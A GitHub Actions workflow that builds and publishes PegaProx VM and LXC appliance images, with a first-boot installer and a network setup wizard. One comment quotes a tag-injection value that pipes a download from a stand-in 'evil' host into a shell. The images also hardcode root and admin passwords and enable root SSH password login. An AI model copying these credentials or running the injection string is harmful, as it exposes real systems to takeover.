name: Build Release Appliances (VM + LXC)

on:
  release:
    types: [published]
  workflow_dispatch:
    inputs:
      tag:
        description: "Release-Tag (z. B. v0.9.11)"
        required: false
        default: ""

permissions:
  contents: write

env:
  PVE_PORT: "5000"
  DEBIAN_RELEASE: "trixie"
  APT_POLL_RETRIES: "150"   # NS 2026-06-05 — gyptazy repo can lag; give it longer
  APT_POLL_INTERVAL: "30"

jobs:
  # ----------------------------------------------------------------------
  # 1) Version ermitteln + warten bis Release-Paket im gyptazy-Repo ist
  # ----------------------------------------------------------------------
  prepare:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.ver.outputs.version }}
      is_release: ${{ steps.ver.outputs.is_release }}
    steps:
      - id: ver
        name: Release-Version ermitteln
        # NS 2026-05-30 — release.tag_name and inputs.tag are user-controllable
        # by anyone with push/workflow_dispatch rights. Interpolating ${{ }}
        # inline into the shell `run:` block evaluates before quoting and lets
        # a tag like `'; curl evil | sh; #` escape into the script. Read them
        # via env vars so the shell quotes naturally.
        env:
          RELEASE_TAG_NAME: ${{ github.event.release.tag_name }}
          INPUT_TAG:        ${{ inputs.tag }}
        run: |
          if [ -n "$RELEASE_TAG_NAME" ]; then
            V="$RELEASE_TAG_NAME"
            REL="true"
          elif [ -n "$INPUT_TAG" ]; then
            V="$INPUT_TAG"
            REL="true"
          else
            V="dev-$(date +%Y%m%d-%H%M%S)"
            REL="false"
          fi
          echo "Version: $V (is_release=$REL)"
          echo "version=$V"      >> "$GITHUB_OUTPUT"
          echo "is_release=$REL" >> "$GITHUB_OUTPUT"

      - name: Tools
        if: steps.ver.outputs.is_release == 'true'
        run: |
          sudo apt-get update
          sudo apt-get install -y curl gnupg ca-certificates

      - name: Auf PegaProx-Paket im APT-Repo warten
        if: steps.ver.outputs.is_release == 'true'
        run: |
          set -e
          curl -fsSL https://git.gyptazy.com/api/packages/gyptazy/debian/repository.key \
            -o gyptazy.asc
          mkdir -p apt-root/etc/apt/sources.list.d \
                   apt-root/etc/apt/keyrings \
                   apt-root/var/lib/apt/lists/partial \
                   apt-root/var/cache/apt/archives/partial
          cp gyptazy.asc apt-root/etc/apt/keyrings/gyptazy.asc
          echo "deb [signed-by=$(pwd)/apt-root/etc/apt/keyrings/gyptazy.asc] https://packages.gyptazy.com/api/packages/gyptazy/debian ${DEBIAN_RELEASE} main" \
            > apt-root/etc/apt/sources.list.d/gyptazy.list

          WANT="$(echo '${{ steps.ver.outputs.version }}' | sed 's/^v//')"
          echo "Erwarte Paketversion (Präfix): $WANT"

          APT_OPTS="-o Dir::Etc::sourcelist=$(pwd)/apt-root/etc/apt/sources.list.d/gyptazy.list \
                    -o Dir::Etc::sourceparts=- \
                    -o Dir::Etc::trusted=$(pwd)/apt-root/etc/apt/keyrings/gyptazy.asc \
                    -o Dir::State::lists=$(pwd)/apt-root/var/lib/apt/lists \
                    -o Dir::Cache=$(pwd)/apt-root/var/cache/apt"

          FOUND=""
          for i in $(seq 1 "${APT_POLL_RETRIES}"); do
            apt-get $APT_OPTS update >/dev/null 2>&1 || true
            CAND="$(apt-cache $APT_OPTS madison pegaprox 2>/dev/null | awk '{print $3}' || true)"
            MATCH="$(echo "$CAND" | grep -E "^${WANT}([.+~-]|$)" | head -n1 || true)"
            if [ -n "$MATCH" ]; then
              FOUND="$MATCH"
              echo "Gefunden: pegaprox=$FOUND"
              break
            fi
            echo "[$i/${APT_POLL_RETRIES}] Paket $WANT noch nicht im Repo, warte ${APT_POLL_INTERVAL}s..."
            sleep "${APT_POLL_INTERVAL}"
          done

          if [ -z "$FOUND" ]; then
            echo "::error::Paket für $WANT ist nach dem Timeout nicht im gyptazy-Repo aufgetaucht."
            exit 1
          fi
          echo "Release-Paket ist verfügbar, Build kann starten."

      - name: Dev-Build - Poll übersprungen
        if: steps.ver.outputs.is_release != 'true'
        run: |
          echo "Manueller Dev-Build ohne Tag ('${{ steps.ver.outputs.version }}')."
          echo "Repo-Poll wird übersprungen. Es wird die aktuell neueste pegaprox-Version installiert."

  # ----------------------------------------------------------------------
  # 2) LXC-Template per distrobuilder (Snap) + Smoke-Test
  # ----------------------------------------------------------------------
  build-lxc:
    needs: prepare
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4.3.1

      - name: Tools installieren
        run: |
          sudo apt-get update
          sudo apt-get install -y \
            debootstrap rsync systemd-container curl xz-utils
          sudo snap install distrobuilder --classic
          export PATH="$PATH:/snap/bin"
          distrobuilder --version

      - name: distrobuilder-Definition schreiben
        run: |
          mkdir -p packaging/lxc
          cat > packaging/lxc/pegaprox-lxc.yaml <<YAML
          image:
            distribution: debian
            release: ${DEBIAN_RELEASE}
            description: PegaProx LXC Appliance
            architecture: amd64

          source:
            downloader: debootstrap
            url: http://deb.debian.org/debian
            keyserver: keyserver.ubuntu.com

          targets:
            lxc:
              create_message: |
                PegaProx Appliance - Login: root / PegaProx2026!
              config:
                - type: all
                  before: 5
                  content: |-
                    lxc.include = LXC_TEMPLATE_CONFIG/common.conf
                - type: all
                  after: 4
                  content: |-
                    lxc.include = LXC_TEMPLATE_CONFIG/userns.conf
                - type: all
                  content: |-
                    lxc.arch = x86_64

          packages:
            manager: apt
            update: true
            cleanup: true
            sets:
              - packages:
                  - python3
                  - python3-pip
                  - curl
                  - ca-certificates
                  - gnupg
                  - sudo
                  - sqlite3
                  - systemd
                  - systemd-sysv
                action: install

          actions:
            - trigger: post-packages
              action: |-
                #!/bin/sh
                set -eu
                install -d -m 0755 /etc/apt/keyrings
                curl -fsSL https://git.gyptazy.com/api/packages/gyptazy/debian/repository.key \\
                  -o /etc/apt/keyrings/gyptazy.asc
                echo "deb [signed-by=/etc/apt/keyrings/gyptazy.asc] https://packages.gyptazy.com/api/packages/gyptazy/debian ${DEBIAN_RELEASE} main" \\
                  > /etc/apt/sources.list.d/gyptazy.list
                apt-get update
                apt-get -y install pegaprox
                systemctl enable pegaprox || true
                # --- Root-Login setzen ---
                echo 'root:PegaProx2026!' | chpasswd

          mappings:
            architecture_map: debian
          YAML

      - name: rootfs bauen
        run: |
          export PATH="$PATH:/snap/bin"
          sudo --preserve-env=PATH "$(command -v distrobuilder)" \
            build-lxc packaging/lxc/pegaprox-lxc.yaml \
            -o image.release=${DEBIAN_RELEASE}
          ls -lh *.tar.xz

      - name: Smoke-Test (Container starten + HTTP-Check)
        run: |
          set -e
          mkdir -p /tmp/ct/rootfs
          sudo tar -xpJf rootfs.tar.xz -C /tmp/ct/rootfs

          sudo systemd-nspawn -D /tmp/ct/rootfs \
            --machine pegaprox-test \
            --boot \
            --bind-ro=/etc/resolv.conf \
            > /tmp/nspawn.log 2>&1 &

          echo "Warte auf PegaProx auf Port ${PVE_PORT}..."
          OK=0
          for i in $(seq 1 36); do
            if curl -kfs "https://localhost:${PVE_PORT}/" >/dev/null 2>&1 \
               || curl -fs "http://localhost:${PVE_PORT}/" >/dev/null 2>&1; then
              OK=1; break
            fi
            sleep 5
          done

          echo "----- Letzte Zeilen des Container-Logs -----"
          tail -n 40 /tmp/nspawn.log || true
          echo "----- Lauschende Ports auf dem Host -----"
          sudo ss -tlnp || true

          sudo machinectl poweroff pegaprox-test 2>/dev/null || true
          sleep 3
          sudo machinectl terminate pegaprox-test 2>/dev/null || true

          [ "$OK" -eq 1 ] || { echo "::error::PegaProx kam im LXC nicht hoch"; exit 1; }
          echo "LXC Smoke-Test erfolgreich."

      - name: Template umbenennen
        run: |
          mv rootfs.tar.xz \
            "pegaprox-${{ needs.prepare.outputs.version }}-lxc-amd64.tar.xz"
          # NS 2026-06-05 — also ship a stable -latest- name so the GitHub
          # releases/latest/download/ URL always resolves to the newest LXC
          # template (same as Docker's :latest). Byte-identical copy.
          cp "pegaprox-${{ needs.prepare.outputs.version }}-lxc-amd64.tar.xz" \
             "pegaprox-latest-lxc-amd64.tar.xz"

      - name: Artefakt sichern
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
        with:
          name: lxc-template
          path: pegaprox-*lxc*.tar.xz
          retention-days: 7

  # ----------------------------------------------------------------------
  # 3) VM-Image: apt-Paket-Install + Wizard beim First Boot / Login
  # ----------------------------------------------------------------------
  build-vm:
    needs: prepare
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4.3.1

      - name: Tools installieren
        run: |
          sudo apt-get update
          sudo apt-get install -y \
            qemu-utils qemu-system-x86 cloud-image-utils curl

      - name: Debian Cloud-Image laden + Checksum verifizieren
        run: |
          # NS 2026-05-30 — the image we pull here becomes the rootfs of every
          # published PegaProx VM appliance. Downloading over plain HTTPS without
          # verifying the bytes against the published checksum leaves a
          # supply-chain hole: a compromised mirror or a MITM with a forged cert
          # could substitute a backdoored qcow2 and every release artefact would
          # carry it. Fix: pull SHA512SUMS from the same path Debian publishes
          # alongside the image and fail the build if the hash doesn't match.
          set -euo pipefail
          BASE_URL="https://cloud.debian.org/images/cloud/${DEBIAN_RELEASE}/latest"
          IMG_NAME="debian-13-genericcloud-amd64.qcow2"

          wget -q -O pegaprox.qcow2 "${BASE_URL}/${IMG_NAME}"
          wget -q -O SHA512SUMS     "${BASE_URL}/SHA512SUMS"

          # SHA512SUMS lists every asset Debian ships at this path. Pull the
          # row for our image, swap the original filename for the local name
          # we saved under, then let sha512sum do the actual comparison.
          # Failing here aborts the build before the image ever touches the
          # next step, which is exactly what we want.
          EXPECTED_LINE=$(grep "[ \t*]${IMG_NAME}\$" SHA512SUMS || true)
          if [ -z "${EXPECTED_LINE}" ]; then
            echo "::error::SHA512SUMS does not contain a line for ${IMG_NAME}"
            echo "::error::SHA512SUMS contents:"
            cat SHA512SUMS
            exit 1
          fi
          echo "${EXPECTED_LINE}" | sed "s| [ *]${IMG_NAME}\$|  pegaprox.qcow2|" > pegaprox.qcow2.sha512
          sha512sum -c pegaprox.qcow2.sha512

          qemu-img resize pegaprox.qcow2 20G

      - name: Dateien per qemu-nbd einhängen
        run: |
          set -e

          # --- gyptazy-Repo-Key + Sourceliste ---
          curl -fsSL https://git.gyptazy.com/api/packages/gyptazy/debian/repository.key \
            -o gyptazy.asc

          cat > gyptazy.list <<GYPTLIST
          deb [signed-by=/etc/apt/keyrings/gyptazy.asc] https://packages.gyptazy.com/api/packages/gyptazy/debian ${DEBIAN_RELEASE} main
          GYPTLIST

          # ==================================================================
          # First-Boot-Installer: apt-Paket + User + SSH
          # ==================================================================
          cat > install-pegaprox.sh <<'INSTALLEOF'
          #!/bin/sh
          set -eu
          export DEBIAN_FRONTEND=noninteractive

          # --- Basis-Tools + PegaProx ---
          apt-get update
          apt-get -y install sudo sqlite3 ca-certificates curl
          apt-get -y install pegaprox
          systemctl enable pegaprox || true

          # --- Login-User mit sudo ---
          if ! id pegaprox_admin >/dev/null 2>&1; then
            useradd -m -s /bin/bash pegaprox_admin
          fi
          usermod -aG sudo pegaprox_admin || true
          echo 'pegaprox_admin:PegaProx2026!' | chpasswd
          echo 'root:7eF9$&JHVspAmjWKcGmD!6QypzBsbmyA' | chpasswd

          # --- SSH: Passwort-Login erlauben ---
          mkdir -p /etc/ssh/sshd_config.d
          printf 'PasswordAuthentication yes\nKbdInteractiveAuthentication yes\nPermitRootLogin yes\n' \
            > /etc/ssh/sshd_config.d/99-pegaprox.conf
          systemctl reload ssh 2>/dev/null \
            || systemctl restart ssh 2>/dev/null \
            || systemctl restart sshd 2>/dev/null || true

          mkdir -p /etc/pegaprox
          systemctl disable pegaprox-firstboot.service || true
          INSTALLEOF

          cat > pegaprox-firstboot.service <<'SVCEOF'
          [Unit]
          Description=PegaProx First Boot Installer
          After=network-online.target
          Wants=network-online.target
          ConditionPathExists=/usr/local/sbin/install-pegaprox.sh

          [Service]
          Type=oneshot
          ExecStart=/usr/local/sbin/install-pegaprox.sh
          RemainAfterExit=yes

          [Install]
          WantedBy=multi-user.target
          SVCEOF

          # ==================================================================
          # Interaktiver Setup-Wizard (systemd-networkd, heredoc-frei)
          # User-sichtbare Texte: ENGLISCH
          # ==================================================================
          cat > pegaprox-setup <<'WIZ'
          #!/bin/bash
          # PegaProx First-Boot Wizard (interactive)
          MARKER="/etc/pegaprox/.setup-complete"
          C='\033[0;36m'; G='\033[0;32m'; Y='\033[1;33m'; R='\033[0;31m'; N='\033[0m'

          detect_interface() {
            local raw
            raw=$(ip -o link show | awk -F': ' '{print $2}' | grep -v '^lo$' | head -n1)
            echo "${raw%%@*}"
          }
          get_current_ip() {
            ip -4 addr show "$1" 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -n1
          }
          validate_ip() {
            [[ $1 =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]] || return 1
            local i; IFS='.' read -ra A <<< "$1"
            for i in "${A[@]}"; do [ "$i" -le 255 ] || return 1; done
          }
          mask_to_cidr() {
            case "$1" in
              255.255.255.0) echo 24;; 255.255.254.0) echo 23;; 255.255.252.0) echo 22;;
              255.255.248.0) echo 21;; 255.255.240.0) echo 20;; 255.255.0.0) echo 16;;
              255.0.0.0) echo 8;; *) echo "";;
            esac
          }
          parse_subnet() {
            local in="$1"
            [[ $in =~ ^[0-9]+$ ]] && [ "$in" -ge 0 ] && [ "$in" -le 32 ] && { echo "$in"; return; }
            local c; c=$(mask_to_cidr "$in"); [ -n "$c" ] && echo "$c"
          }
          find_db() {
            for db in /var/lib/pegaprox/pegaprox.db /var/lib/pegaprox/config/pegaprox.db \
                      /etc/pegaprox/pegaprox.db /usr/lib/pegaprox/config/pegaprox.db \
                      /opt/PegaProx/config/pegaprox.db; do
              [ -f "$db" ] && { echo "$db"; return; }
            done
          }

          [ "$EUID" -ne 0 ] && { echo -e "${R}Please run as root: sudo pegaprox-setup${N}"; exit 1; }
          mkdir -p /etc/pegaprox

          if [ -f "$MARKER" ] && [ "${1:-}" != "--force" ] && [ "${1:-}" != "-f" ]; then
            IFACE=$(detect_interface)
            echo -e "${G}PegaProx is already configured.${N}"
            echo -e "Access: ${C}https://$(get_current_ip "$IFACE"):5000${N}"
            echo -e "Reconfigure: ${Y}sudo pegaprox-setup --force${N}"
            exit 0
          fi
          if [ "${1:-}" = "--force" ] || [ "${1:-}" = "-f" ]; then rm -f "$MARKER"; fi

          clear
          echo -e "${C}===============================================${N}"
          echo -e "${C}      PegaProx First-Boot Configuration${N}"
          echo -e "${C}===============================================${N}"
          echo ""
          echo -e "${Y}This wizard configures the network and starts PegaProx.${N}"
          read -p "Press ENTER to continue..." _

          ACCESS_PORT=5000
          IFACE=$(detect_interface); IFACE="${IFACE:-eth0}"
          echo ""
          echo -e "Detected interface: ${C}$IFACE${N}"
          CUR=$(get_current_ip "$IFACE"); [ -n "$CUR" ] && echo -e "Current IP: ${C}$CUR${N}"
          echo ""
          echo "1) Static IP (recommended)"
          echo "2) DHCP"
          USE_DHCP=false
          while true; do
            read -p "Selection [1/2]: " ch
            case "$ch" in 1) USE_DHCP=false; break;; 2) USE_DHCP=true; break;; esac
          done

          if [ "$USE_DHCP" = false ]; then
            while true; do read -p "IP address (e.g. 192.168.1.50): " IP_ADDR; validate_ip "$IP_ADDR" && break; echo -e "${R}Invalid IP${N}"; done
            while true; do read -p "Subnet (24 or 255.255.255.0): " SIN; SUBNET=$(parse_subnet "$SIN"); [ -n "$SUBNET" ] && break; echo -e "${R}Invalid subnet${N}"; done
            while true; do read -p "Gateway (e.g. 192.168.1.1): " GATEWAY; validate_ip "$GATEWAY" && break; echo -e "${R}Invalid gateway${N}"; done
            while true; do read -p "DNS (e.g. 8.8.8.8 1.1.1.1): " DNS; validate_ip "$(echo $DNS | awk '{print $1}')" && break; echo -e "${R}Invalid DNS${N}"; done
            echo -e "${Y}Summary:${N} $IFACE  $IP_ADDR/$SUBNET  gw $GATEWAY  dns $DNS"
            read -p "Correct? [Y/n]: " ok
            case "$ok" in [Nn]*) echo "Aborted."; exit 1;; esac
          fi

          echo ""
          echo "Port configuration:"
          echo "  1) Default (5000/5001/5002)"
          echo "  2) HTTPS   (443/444/445)"
          echo "  3) Custom base port"
          while true; do
            read -p "Selection [1/2/3]: " p
            case "$p" in
              1) ACCESS_PORT=5000; break;;
              2) ACCESS_PORT=443; break;;
              3) read -p "Base port (1-65535): " cp
                 if [[ "$cp" =~ ^[0-9]+$ ]] && [ "$cp" -ge 1 ] && [ "$cp" -le 65535 ]; then ACCESS_PORT=$cp; break; fi;;
            esac
          done

          echo ""
          echo -e "${C}Applying network configuration...${N}"
          mkdir -p /etc/cloud/cloud.cfg.d
          echo 'network: {config: disabled}' > /etc/cloud/cloud.cfg.d/99-disable-network-config.cfg
          mkdir -p /etc/systemd/network
          rm -f /etc/systemd/network/*.network 2>/dev/null || true

          if [ "$USE_DHCP" = true ]; then
            printf '[Match]\nName=%s\n\n[Network]\nDHCP=yes\n' "$IFACE" > /etc/systemd/network/10-pegaprox.network
          else
            { printf '[Match]\nName=%s\n\n[Network]\nAddress=%s/%s\nGateway=%s\n' "$IFACE" "$IP_ADDR" "$SUBNET" "$GATEWAY"
              for d in $DNS; do printf 'DNS=%s\n' "$d"; done
            } > /etc/systemd/network/10-pegaprox.network
            { echo "# Generated by PegaProx Setup"; for d in $DNS; do echo "nameserver $d"; done; } > /etc/resolv.conf
          fi
          systemctl disable networking 2>/dev/null || true
          systemctl enable systemd-networkd 2>/dev/null || true

          echo -e "${R}Network will be restarted - your SSH session may drop.${N}"
          [ "$USE_DHCP" = false ] && echo -e "New IP: ${C}$IP_ADDR${N}"
          read -p "Press ENTER to apply..." _
          systemctl restart systemd-networkd 2>/dev/null || true
          sleep 3

          systemctl daemon-reload
          systemctl enable pegaprox 2>/dev/null || true
          systemctl restart pegaprox 2>/dev/null || systemctl start pegaprox 2>/dev/null || true
          echo "Waiting for database initialization..."
          sleep 8

          if [ "$ACCESS_PORT" != 5000 ]; then
            DB=$(find_db)
            if [ -n "$DB" ]; then
              if sqlite3 "$DB" "INSERT OR REPLACE INTO server_settings (key, value) VALUES ('port','$ACCESS_PORT');" 2>/dev/null; then
                systemctl restart pegaprox 2>/dev/null || true; sleep 4
                echo -e "${G}Port set to $ACCESS_PORT${N}"
              else
                echo -e "${Y}Could not set port automatically - please set it in the settings.${N}"
              fi
            else
              echo -e "${Y}Database not found - set the port under Settings > Server.${N}"
            fi
          fi

          systemctl is-active --quiet pegaprox \
            && echo -e "${G}PegaProx is running.${N}" \
            || echo -e "${R}PegaProx failed to start - check: journalctl -u pegaprox${N}"

          echo ""
          echo -e "${Y}Set a password for the login user 'pegaprox_admin':${N}"
          read -p "Set it now? [Y/n]: " sp
          case "${sp:-y}" in
            [Nn]*) echo -e "${Y}Later with: passwd pegaprox_admin${N}";;
            *) passwd pegaprox_admin || echo -e "${Y}Password change skipped.${N}";;
          esac

          mkdir -p /etc/pegaprox
          touch "$MARKER"
          FIP=$(get_current_ip "$IFACE")
          echo ""
          echo -e "${G}Setup complete!${N}"
          if [ -n "$FIP" ]; then
            if [ "$ACCESS_PORT" = 443 ]; then echo -e "  Web: ${C}https://$FIP${N}"; else echo -e "  Web: ${C}https://$FIP:$ACCESS_PORT${N}"; fi
          else
            echo -e "  Web: ${C}https://<ip>:$ACCESS_PORT${N}"
          fi
          WIZ

          # ==================================================================
          # Unattended Setup (cloud-init) - user-sichtbare Logs: ENGLISCH
          # ==================================================================
          cat > pegaprox-setup-auto <<'AUTO'
          #!/bin/bash
          set -e
          MARKER="/etc/pegaprox/.setup-complete"
          IP="${PEGAPROX_IP:-}"; CIDR="${PEGAPROX_CIDR:-24}"; GW="${PEGAPROX_GW:-}"
          DNS="${PEGAPROX_DNS:-8.8.8.8 8.8.4.4}"; DHCP="${PEGAPROX_DHCP:-false}"
          FORCE="${PEGAPROX_FORCE:-false}"; IFACE="${PEGAPROX_IFACE:-}"; PORT="${PEGAPROX_PORT:-5000}"

          log(){ echo "[$(date '+%H:%M:%S')] $1"; }
          mask_to_cidr(){ case "$1" in 255.255.255.0) echo 24;; 255.255.254.0) echo 23;; 255.255.252.0) echo 22;; 255.255.248.0) echo 21;; 255.255.240.0) echo 20;; 255.255.0.0) echo 16;; 255.0.0.0) echo 8;; *) echo "";; esac; }
          find_db(){ for db in /var/lib/pegaprox/pegaprox.db /var/lib/pegaprox/config/pegaprox.db /etc/pegaprox/pegaprox.db /usr/lib/pegaprox/config/pegaprox.db /opt/PegaProx/config/pegaprox.db; do [ -f "$db" ] && { echo "$db"; return; }; done; }

          for arg in "$@"; do case $arg in
            --ip=*) IP="${arg#*=}";;
            --cidr=*|--subnet=*|--mask=*) CIDR="${arg#*=}";;
            --gateway=*|--gw=*) GW="${arg#*=}";;
            --dns=*) DNS="${arg#*=}";;
            --interface=*|--iface=*) IFACE="${arg#*=}";;
            --port=*) PORT="${arg#*=}";;
            --dhcp) DHCP=true;;
            --force|-f) FORCE=true;;
            --help|-h) echo "Usage: pegaprox-setup-auto --ip=X --cidr=24 --gateway=X [--dns='..'] [--port=443] | --dhcp [--force]"; exit 0;;
          esac; done

          [ "$EUID" -ne 0 ] && { log "ERROR: root required"; exit 1; }
          mkdir -p /etc/pegaprox
          if [ -f "$MARKER" ] && [ "$FORCE" != "true" ]; then log "Already configured"; exit 0; fi
          [ "$FORCE" = "true" ] && rm -f "$MARKER" || true

          [ -z "$IFACE" ] && IFACE=$(ip -o link show | awk -F': ' '{print $2}' | grep -v '^lo$' | head -n1) || true
          IFACE="${IFACE%%@*}"; IFACE="${IFACE:-eth0}"
          [[ ! $CIDR =~ ^[0-9]+$ ]] && CIDR=$(mask_to_cidr "$CIDR") || true
          [ -z "$CIDR" ] && CIDR=24 || true

          if [ "$DHCP" != "true" ]; then
            [ -z "$IP" ] && { log "ERROR: --ip required"; exit 1; }
            [ -z "$GW" ] && { log "ERROR: --gateway required"; exit 1; }
          fi

          log "Interface: $IFACE"
          mkdir -p /etc/cloud/cloud.cfg.d
          echo 'network: {config: disabled}' > /etc/cloud/cloud.cfg.d/99-disable-network-config.cfg
          mkdir -p /etc/systemd/network
          rm -f /etc/systemd/network/*.network 2>/dev/null || true

          if [ "$DHCP" = "true" ]; then
            printf '[Match]\nName=%s\n\n[Network]\nDHCP=yes\n' "$IFACE" > /etc/systemd/network/10-pegaprox.network
            log "DHCP configured on $IFACE"
          else
            { printf '[Match]\nName=%s\n\n[Network]\nAddress=%s/%s\nGateway=%s\n' "$IFACE" "$IP" "$CIDR" "$GW"
              for d in $DNS; do printf 'DNS=%s\n' "$d"; done
            } > /etc/systemd/network/10-pegaprox.network
            { echo "# Generated by PegaProx Setup"; for d in $DNS; do echo "nameserver $d"; done; } > /etc/resolv.conf
            log "Static: $IP/$CIDR gw $GW"
          fi
          systemctl disable networking 2>/dev/null || true
          systemctl enable systemd-networkd 2>/dev/null || true
          systemctl restart systemd-networkd 2>/dev/null || true
          sleep 3

          systemctl daemon-reload
          systemctl enable pegaprox 2>/dev/null || true
          systemctl restart pegaprox 2>/dev/null || systemctl start pegaprox 2>/dev/null || true
          sleep 8

          if [ "$PORT" != 5000 ]; then
            DB=$(find_db || true)
            if [ -n "$DB" ]; then
              sqlite3 "$DB" "INSERT OR REPLACE INTO server_settings (key, value) VALUES ('port','$PORT');" 2>/dev/null \
                && { systemctl restart pegaprox 2>/dev/null || true; sleep 4; log "Port set to $PORT"; } \
                || log "Could not set port automatically"
            fi
          fi

          if systemctl is-active --quiet pegaprox; then
            touch "$MARKER"
            FINAL=$(ip -4 addr show "$IFACE" 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -n1 || true)
            [ "$PORT" = 443 ] && log "Done: https://${FINAL:-<ip>}" || log "Done: https://${FINAL:-<ip>}:$PORT"
          else
            log "ERROR: pegaprox failed to start"; exit 1
          fi
          AUTO

          # ==================================================================
          # Autostart des Wizards beim ersten Login - Hinweis: ENGLISCH
          # ==================================================================
          cat > pegaprox-firstboot-profile.sh <<'PROF'
          #!/bin/bash
          if [ ! -f /etc/pegaprox/.setup-complete ] && [ -t 0 ] && [ -z "${PEGAPROX_SKIP_SETUP:-}" ]; then
            echo ""
            echo -e "\033[1;33mPegaProx needs to be configured. The wizard starts in 5s (Ctrl+C to cancel)...\033[0m"
            sleep 5
            if [ "$EUID" -eq 0 ]; then
              /usr/local/bin/pegaprox-setup
            elif command -v sudo >/dev/null 2>&1; then
              sudo /usr/local/bin/pegaprox-setup
            fi
          fi
          PROF

          # ==================================================================
          # qcow2 als NBD-Blockgerät einhängen
          # ==================================================================
          sudo modprobe nbd max_part=16
          sudo qemu-nbd --connect=/dev/nbd0 pegaprox.qcow2
          for i in $(seq 1 10); do
            sudo partprobe /dev/nbd0 2>/dev/null || true
            sleep 1
            ls /dev/nbd0p* >/dev/null 2>&1 && break
          done
          echo "Partitionen:"; lsblk /dev/nbd0

          ROOT=""
          for PART in $(ls /dev/nbd0p* 2>/dev/null); do
            sudo mkdir -p /mnt/probe
            if sudo mount "$PART" /mnt/probe 2>/dev/null; then
              if [ -f /mnt/probe/etc/os-release ]; then
                ROOT="$PART"; sudo umount /mnt/probe; break
              fi
              sudo umount /mnt/probe
            fi
          done
          [ -n "$ROOT" ] || { echo "::error::Root-Partition nicht gefunden"; exit 1; }
          echo "Root-Partition: $ROOT"

          sudo mkdir -p /mnt/img
          sudo mount "$ROOT" /mnt/img

          # --- Dateien hineinkopieren ---
          sudo mkdir -p /mnt/img/etc/apt/keyrings /mnt/img/etc/pegaprox
          sudo cp gyptazy.asc  /mnt/img/etc/apt/keyrings/gyptazy.asc
          sudo cp gyptazy.list /mnt/img/etc/apt/sources.list.d/gyptazy.list

          sudo cp install-pegaprox.sh /mnt/img/usr/local/sbin/install-pegaprox.sh
          sudo cp pegaprox-setup      /mnt/img/usr/local/bin/pegaprox-setup
          sudo cp pegaprox-setup-auto /mnt/img/usr/local/bin/pegaprox-setup-auto
          sudo chmod 0755 /mnt/img/usr/local/sbin/install-pegaprox.sh \
                          /mnt/img/usr/local/bin/pegaprox-setup \
                          /mnt/img/usr/local/bin/pegaprox-setup-auto

          sudo cp pegaprox-firstboot-profile.sh \
            /mnt/img/etc/profile.d/pegaprox-firstboot.sh
          sudo chmod 0755 /mnt/img/etc/profile.d/pegaprox-firstboot.sh

          sudo cp pegaprox-firstboot.service \
            /mnt/img/etc/systemd/system/pegaprox-firstboot.service

          # --- Services aktivieren (Symlinks, kein chroot nötig) ---
          sudo mkdir -p /mnt/img/etc/systemd/system/multi-user.target.wants
          sudo ln -sf /etc/systemd/system/pegaprox-firstboot.service \
            /mnt/img/etc/systemd/system/multi-user.target.wants/pegaprox-firstboot.service

          for U in ssh.service sshd.service; do
            if [ -f "/mnt/img/lib/systemd/system/$U" ] || [ -f "/mnt/img/usr/lib/systemd/system/$U" ]; then
              SRC="/lib/systemd/system/$U"
              [ -f "/mnt/img/usr/lib/systemd/system/$U" ] && SRC="/usr/lib/systemd/system/$U"
              sudo ln -sf "$SRC" \
                "/mnt/img/etc/systemd/system/multi-user.target.wants/$U"
              break
            fi
          done

          sudo sync
          sudo umount /mnt/img
          sudo qemu-nbd --disconnect /dev/nbd0
          echo "Image-Bearbeitung abgeschlossen."

      - name: Smoke-Test (VM booten + First-Boot-Install + HTTP-Check)
        run: |
          set -e
          cat > user-data <<'EOF'
          #cloud-config
          password: pegaprox
          chpasswd: { expire: false }
          ssh_pwauth: true
          EOF
          echo "instance-id: iid-pegaprox" > meta-data
          cloud-localds seed.iso user-data meta-data

          qemu-system-x86_64 \
            -m 2048 -smp 2 \
            -drive file=pegaprox.qcow2,format=qcow2,if=virtio \
            -drive file=seed.iso,format=raw,if=virtio \
            -netdev user,id=n0,hostfwd=tcp::${PVE_PORT}-:${PVE_PORT} \
            -device virtio-net-pci,netdev=n0 \
            -display none -daemonize -pidfile qemu.pid

          echo "Warte auf PegaProx in der VM (First-Boot-Install, max. 8 min)..."
          OK=0
          for i in $(seq 1 96); do
            if curl -kfs "https://localhost:${PVE_PORT}/" >/dev/null 2>&1 \
               || curl -fs "http://localhost:${PVE_PORT}/" >/dev/null 2>&1; then
              OK=1; break
            fi
            sleep 5
          done
          sudo kill "$(cat qemu.pid)" 2>/dev/null || true
          [ "$OK" -eq 1 ] || { echo "::error::PegaProx kam in der VM nicht hoch"; exit 1; }
          echo "VM Smoke-Test erfolgreich."

      - name: Image komprimieren + umbenennen
        run: |
          qemu-img convert -O qcow2 -c pegaprox.qcow2 \
            "pegaprox-${{ needs.prepare.outputs.version }}-vm-amd64.qcow2"
          cp "pegaprox-${{ needs.prepare.outputs.version }}-vm-amd64.qcow2" \
             "pegaprox-vm-amd64.qcow2"

      - name: Artefakt sichern
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
        with:
          name: vm-image
          path: pegaprox-*vm*.qcow2
          retention-days: 7

  # ----------------------------------------------------------------------
  # 4) Alles an den Release anhängen
  # ----------------------------------------------------------------------
  publish:
    needs: [prepare, build-lxc, build-vm]
    if: ${{ always() && needs.build-lxc.result == 'success' && needs.build-vm.result == 'success' }}
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4.3.0
        with:
          path: dist

      - name: Checksums erzeugen
        run: |
          cd dist
          find . -type f \( -name '*.qcow2' -o -name '*.tar.xz' \) \
            -exec sha256sum {} \; > SHA256SUMS.txt
          cat SHA256SUMS.txt

      - name: An Release anhängen
        uses: softprops/action-gh-release@3bb12739c298aeb8a4eeaf626c5b8d85266b0e65 # v2.6.2
        with:
          tag_name: ${{ needs.prepare.outputs.version }}
          files: |
            dist/**/*.qcow2
            dist/**/*.tar.xz
